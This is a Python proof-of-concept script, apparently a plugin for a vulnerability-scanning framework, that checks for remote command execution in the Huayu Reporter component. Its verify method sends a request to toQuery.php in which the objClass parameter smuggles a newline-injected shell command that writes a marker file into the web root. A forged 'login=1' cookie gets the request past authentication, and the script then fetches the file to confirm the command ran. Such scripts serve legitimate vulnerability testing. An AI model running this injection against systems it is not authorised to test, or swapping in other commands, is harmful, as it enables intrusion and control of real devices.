from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin

POC_NAME = "huayu_reporter_rce"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class huayu_reporter_rce(BasePoc):
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0041',    # PoC的VID编号
            'vbid': '',
            'Name': 'huayu_reporter_rce',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-1',    # PoC创建时间
            },

        'vul': {
            'Product': '华域Reporter组件',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'rce',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                华域Reporter组件存在漏洞，该组件的设备较多，多用于上网行为管理设备的报表系统，该漏洞利用难度低，影响范围较广。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-1',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        payload1 = urljoin(target,"/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27lUc1f3r11%27%20>/var/www/reporter/luci.txt%0a")

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        print("[+] wirting test data into luci.txt: ", payload1)
        resp = req(payload1, 'get', headers=header, allow_redirects=False)
        if resp.status_code == 200:
            print("[+] writing test data done...")

        payload2 = urljoin(target,"/luci.txt")

        print("[+] requesting test data url: ", payload2)
        resp1 = req(payload2, 'get', headers=header, allow_redirects=False)

        if resp1.status_code == 200 and "lUc1f3r11" in resp1.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = payload2    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp1.text
            if verbose:
                highlight("[+] url: " + payload1 + " 存在华域Reporter组件RCE！！！")
        else:
            if verbose:
                highlight("[+] url: " + payload1 + " 不存在华域Reporter组件RCE！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)